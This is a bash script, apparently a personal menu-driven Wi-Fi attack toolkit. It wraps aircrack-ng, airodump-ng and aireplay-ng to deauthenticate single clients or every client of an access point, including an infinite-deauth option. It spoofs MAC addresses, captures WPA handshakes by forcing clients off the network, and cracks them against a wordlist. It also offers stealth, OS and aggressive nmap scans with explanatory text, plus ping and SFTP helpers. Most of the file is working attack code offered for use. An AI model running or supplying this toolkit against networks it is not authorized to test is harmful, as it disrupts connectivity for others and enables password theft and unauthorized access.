#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 10/03/2020
#Last Modified: 10/06/2020
clear
PS3="NIC#?:"
echo -e "Checking for requirments...!\n"
for app in aircrack-ng macchanger xterm; do
command -v $app 2>&1> /dev/null
if [[ $? = 0 ]]; then
echo -e "\e[92mgreat!\e[00m $app installed\n"
else echo "$app not installed, script will not function correctly!"
fi
done
########################################################################################################################################
Deauth_Single () {
    single () {
wifi=$ADAPTER
sudo airmon-ng start $wifi 2>&1> /dev/null
clear
wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up 2>&1> /dev/null
clear
exec xterm -e sudo airodump-ng $wlan0 &
echo "What channel to use for the attack?"
read CH
kill $!
exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
PID=$!
echo -e "Input info from the new terminal that executed:"
echo -e "Use spacebar to pause then copy info"
read -p "BSSID:? " BSSID
read -p "ESSID:? " ESSID
read -p "STATION:? " STATION
read -p "Deauth Count:? " COUNT
kill $PID
if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
exec xterm -e sudo aireplay-ng --deauth $COUNT -a $BSSID -e $ESSID -c $STATION $wlan0 & 
else
sudo aireplay-ng --deauth $COUNT -a $BSSID -e $ESSID -c $STATION $wlan0
fi

sudo airmon-ng stop $wlan0
sudo ip link set $wifi down && sudo ip link set $wifi up
}
if [[ ${UID} = 0 ]];then
echo -e "#Select Network Adapter#"
select NETWORK in $(ls /sys/class/net); do
ADAPTER=$NETWORK
read -p "Is this the correct adapter $ADAPTER! (y/n/q=quit):" CHOICE
case $CHOICE in
y|Y) single;break;;
n|N) echo "re-running selection!";sleep 1;;
q|Q) break;;
*) echo "invalid input"
esac
done
else 
echo -e "\e[91mOnly root/sudo can run this Function!\e[00m"
sleep 3
fi
clear
}
########################################################################################################################################
Deauth_ALL () {
    all () {
wifi=$ADAPTER
sudo airmon-ng start $wifi 2>&1> /dev/null
clear
wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up 2>&1> /dev/null
clear
exec xterm -e sudo airodump-ng $wlan0 &
echo "What channel to use for the attack?"
read CH
kill $!
exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
PID=$!
echo -e "Input info from the new terminal that executed:"
echo -e "Use spacebar to pause and copy info"
read -p "BSSID:? " BSSID
read -p "Deauth Count:? " COUNT
kill $PID
if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
exec xterm -e sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0 &
else
sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0
fi

sudo airmon-ng stop $wlan0
sudo ip link set $wifi down && sudo ip link set $wifi up
}
if [[ ${UID} = 0 ]];then
echo -e "#Select Network Adapter#"
select NETWORK in $(ls /sys/class/net); do
ADAPTER=$NETWORK
read -p "Is this the correct adapter $ADAPTER! (y/n/q=quit):" CHOICE
case $CHOICE in
y|Y) all;break;;
n|N) echo "re-running selection!";sleep 1;;
q|Q) break;;
*) echo "invalid input";;
esac
done
else
echo -e "\e[91mOnly root/sudo can run this Function!\e[00m"
sleep 3
fi
clear
}
########################################################################################################################################
Change_MAC () {
if [[ ${UID} = 0 ]]; then
command -v macchanger 2>&1> /dev/null
if [ $? = 0 ]; then
echo -e "#Select Network Adapter#"
else echo "macchanger not installed!"
sleep 3
fi
select NETWORK in $(ls /sys/class/net); do
ADAPTER=$NETWORK
read -p "Is this the correct adapter $ADAPTER! (y/n):" CHOICE
if [[ $CHOICE = [yY]* ]]; then
break
elif [[ $CHOICE = [nN]* ]]; then
echo "re-running selection!"
sleep 1
fi
done
read -p "macchanger needs root permissions, press Enter to continue ;) "
sudo ip link set $ADAPTER down && sudo macchanger -A $ADAPTER && sudo ip link set $ADAPTER up
read -p "Press Enter to continue"
else
echo -e "\e[91mOnly root/sudo can run this Function!\e[00m"
sleep 3
fi
clear
}
########################################################################################################################################
Ping_Network () {
    ping_net () {
read -p "Whats your router IP?: " ROUTER
read -p "Whats your modem IP?: " MODEM
read -p "What Web Site or IP would you like to ping?: " OUT   
ping -c1 $ROUTER && ping -c1 $MODEM && ping -c1 $OUT
if [ $? = 0 ]; then
echo
echo -e "\e[92mSuccess!\e[00m"
sleep 3
break
else echo -e "\e[91mUnsuccessful!\e[00m"
sleep 3
fi
}
echo -e "Ping your network to see if you have a working internet connection!" #troubleshooting
echo -e "Press ENTER for a GENERIC home network setup."
echo -e "Or type any character then ENTER, for manual input.."
read -p ""
if [[ $REPLY = "" ]]; then
while true; do
ping -c1 192.168.0.1 || ping -c1 192.168.1.1 && ping -c1 192.168.100.1 || ping -c1 10.0.0.1 && ping -c1 www.yhaoo.com
#ping -c1 $ROUTER && ping -c1 $MODEM && ping -c1 $OUT
if [ $? = 0 ]; then
echo
echo -e "\e[92mSuccess!\e[00m"
sleep 3
break
else echo -e "\e[91mUnsuccessful!\e[00m"
sleep 3
fi
done
else
ping_net
fi
clear
}
########################################################################################################################################
Capture_Handshake () {
if [[ ${UID} = 0 ]];then
if [[ -d $HOME/handshake ]]; then
Handshake_Dir=$HOME/handshake
else mkdir $HOME/handshake
fi
echo -e "#Select network interface to capture handshake:#"
select NETWORK in $(ls /sys/class/net);do
ADAPTER=$NETWORK
read -p "Use $ADAPTER:?(y/n) " CHOICE
case $CHOICE in
y|Y) break ;;
n|N) echo -e "Re-Select" ;;
*) echo "Only (y/n) re-select interface." ;;
esac
done
clear
sudo airmon-ng start $ADAPTER
clear
wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up
clear
read -p "Capture handshake on the 1.)2.4GHz or 2.)5GHz frequency?: " OPTION
case $OPTION in
1) echo "2.4GHz it is!"
sleep 1;;
2) echo "5GHz it is!"
sleep 1;;
*) echo -e " Not Valid number only 1 & 2 "
sleep 2;;
esac
exec xterm -e sudo airodump-ng $wlan0 &
echo -e "Now Scanning all 2.4GHz WiFiChannels"
echo -e "Select the channel of your target AP"
read -p "Xterm will exit after you select a channel: " CH
kill $!
clear
echo -e "Gather info about the AP on channel $CH"
echo -e "Close/spacebar xterm to copy info, xterm will not close!"
echo -e "Xterm will close after Handshake Name has been inputted"
read -p "press ENTER"
exec xterm -hold -e airodump-ng -c $CH $wlan0 &
PID=$!
read -p "BSSID: " BSSID
read -p "ESSID: " ESSID
read -p "STATION: " STATION
read -p "Handshake Name: " HAND
kill $PID
echo -e "One last Xterm session will start.." 
echo -e "This session is to monitor the Handshake on $BSSID." 
echo -e "*This* terminal will deauthenticate $STATION -"
echo -e "to capture the EAPOL packets."
echo -e "You will need the $HAND.cap and $HAND.kismet.csv files for cracking"
echo -e "Don't close any window, Xterm session will close automatically." 
echo 
read -p "Press Enter"
exec xterm -hold -e sudo airodump-ng -c $CH --bssid $BSSID -w $HOME/handshake/$HAND $wlan0 &
PID=$!
sleep 6
sudo aireplay-ng --deauth 10 -a $BSSID -e $ESSID -c $STATION $wlan0 
sleep 30
kill $PID
sudo airmon-ng stop $wlan0
sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up
echo
echo -e "\e[92mGreat!\e[00m Handshake Captured: Press Enter.."
read -p "Remember you will need the $HAND.cap and $HAND.kismet.csv files for cracking!"
rm -i $HOME/handshake/$HAND*
else
echo -e "\e[91mOnly root/sudo can run this Fuction!\e[00m"
sleep 3
fi
clear
}
########################################################################################################################################
Crack_Handshake () {
    crack () {
echo
read -p "Name of captured packet to crack:? " PACKET
read -p "Name of kismet.csv:? " KISMET
read -p "Path of the wordlist:? " WORD
BSSID=$(cat $KISMET | awk -F "," '{ print $1 }' | cut -d ";" -f 4 | tail -1)
ESSID=$(cat $KISMET | awk -F "," '{ print $1 }' | cut -d ";" -f 3 | tail -1)
exec xterm -hold -e aircrack-ng -e $ESSID -b $BSSID -w $WORD $PACKET & 
}
if [[ -d /root/handshake ]] && [[ -f $(find /root/handshake/ -name "*.cap") ]];then
cd /root/handshake
ls
crack
elif [[ ${UID} -ne 0 ]]; then
HOME=$HOME
cd $HOME
echo -e "Full path of Captured Handshake:?"
echo -e "If path dosen't exist it will go back to main menu..."
echo -e "Or enter anything on all prompts to go back\n"
read DIRECTORY
cd $DIRECTORY
if [[ $? -ne 0 ]]; then
echo "Error: no $DIRECTORY"
sleep 3
else
echo
ls
crack
fi
else echo "root user has no Handshake Captures"
sleep 3
fi
clear
}
########################################################################################################################################
Port_Scan () {
while true; do
echo -e "###################################################################################################################################"
echo -e "1).\e[32mPing_Scan\e[00m=Scans the list of devices up and running on a given subnet."
echo -e "             Example nmap -sn 192.168.1.1/24"
echo
echo -e "2).\e[32mScan_a_Single_Host\e[00m=Scans a single host for 1000 well-known ports." 
echo -e "                      These ports are the ones used by popular services like SQL, SNTP, apache, and others."
echo -e "                      Example nmap scanme.nmap.org"
echo
echo -e "3).\e[32mStealth_Scan\e[00m=Stealth scanning is performed by sending an SYN packet and analyzing the response." 
echo -e "                If SYN/ACK is received, it means the port is open, and you can open a TCP connection."
echo -e "                However, a stealth scan never completes the 3-way handshake, which makes it hard for" 
echo -e "                the target to determine the scanning system."
echo -e "                Example nmap -sS scanme.nmap.org"
echo
echo -e "4).\e[32mVersion_Scanning\e[00m=Finding application versions is a crucial part in penetration testing."
echo -e "                    It makes your life easier since you can find an existing vulnerability" 
echo -e "                    from the Common Vulnerabilities and Exploits (CVE) database for a particular" 
echo -e "                    version of the service. You can then use it to attack a machine using an exploitation tool like Metasploit."
echo -e "                    Example nmap -sV scanme.nmap.org"
echo
echo -e "5).\e[32mOS_Scanning\e[00m=In addition to the services and their versions,"
echo -e "               Nmap can provide information about the underlying operating system using TCP/IP fingerprinting." 
echo -e "               Nmap will also try to find the system uptime during an OS scan."
echo -e "               Example nmap -O scanme.nmap.org"
echo
echo -e "6).\e[32mAggressive_Scanning\e[00m=Nmap has an aggressive mode that enables OS detection, version detection," 
echo -e "                       script scanning, and traceroute. You can use the -A argument to perform an aggressive scan."
echo -e "                       Example nmap -A scanme.nmap.org"
echo
echo -e "7).\e[91mQUIT\e[00m\n"
echo -e " CREDITS:https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/"
echo -e "         ****Manish Shivanandhan****"
echo -e "1-7\n"
read -p "#?"
clear
case $REPLY in
1)echo -e "Ping_Scan"
read -p "What is the subnet/ip range to scan?:" IPRANGE
echo "nmap will perform: nmap -sn $IPRANGE"
read -p "PRESS ENTER"
nmap -sn $IPRANGE;;

2)echo -e "Scan_a_Single_Host"
read -p "What is the IP of the host to scan?:" HOST
echo "nmap will perform: nmap $HOST"
read -p "PRESS ENTER"
nmap $HOST;;

3)echo -e "Stealth_Scan"
    Sscan () {
read -p "What is the IP of the host to Stealth_Scan?:" SHOST
echo "nmap will perform: nmap -sS $SHOST"
read -p "PRESS ENTER"
nmap -sS $SHOST
}
if [[ ${UID} -ne 0 ]];then
echo -e "\e[91mRequires root/sudo privileges\e[00m"
else
Sscan   
fi
;;

4)echo -e "Version_Scanning"
read -p "What is the IP of the host to Version_Scan?:" VHOST
echo "nmap will perform: nmap -sV $VHOST"
read -p "PRESS ENTER"
nmap -sV $VHOST;;

5)echo -e "OS_Scanning"
    OSscan () {
read -p "What is the IP of the host to OS_Scan?:" OSHOST
echo "nmap will perform: nmap -O $OSHOST"
read -p "PRESS ENTER"
nmap -O $OSHOST
}
if [[ ${UID} -ne 0 ]];then
echo -e "\e[91mRequires root/sudo privileges\e[00m"
else
OSscan
fi
;;

6)echo -e "Aggressive_Scanning"
read -p "What is the IP of the host to do an Aggressive_Scan?:" AHOST
echo "nmap will perform: nmap -A $AHOST"
read -p "PRESS ENTER"
nmap -A $AHOST
#read -p "ENTER TO CONTINUE"
;;

7)break;;

*)echo "Only numbers 1-7 please!"
sleep 3
clear;;
esac
done
}
########################################################################################################################################
SFTP () {
read -p "User of remote host:" name
read -p "IP Address of remote host:" ipn
read -p "TCP port:" port
sftp -P $port $name@$ipn
if [[ $? = 0 ]]; then
echo -e "\e[92mSuccessful\e[0m"
sleep 2
clear
else echo -e "\e[91mUnsuccessful\e[0m"
sleep 3
fi
clear
}
########################################################################################################################################
while true; do
if [ ${UID} != 0 ]; then
echo -e "\t\tRunning script as [\e[92m$USER!\e[00m]"
elif [ ${UID} = 0 ]; then
echo -e "\t\tRunning script as [\e[91m$USER!\e[00m]"
fi
echo "*Please run Port_Scan in fullscreen, to get best visual results*"
echo -e "  ###########################################################"
echo -e "  #   1.Deauth_Single   4.Ping_Network       7.Port_Scan    #"
echo -e "  #   2.Deauth_ALL      5.Capture_Handshake  8.SFTP         #"
echo -e "  #   3.Change_MAC      6.Crack_Handsake     9.EXIT         #"
echo -e "  ###########################################################"
read -p "#? "
clear
case $REPLY in
1) Deauth_Single ;;

2) Deauth_ALL ;;

3) Change_MAC ;;

4) Ping_Network ;;

5) Capture_Handshake ;;

7) Port_Scan ;;

6) Crack_Handshake ;;

8) SFTP ;;

9) clear;break ;;
esac
done



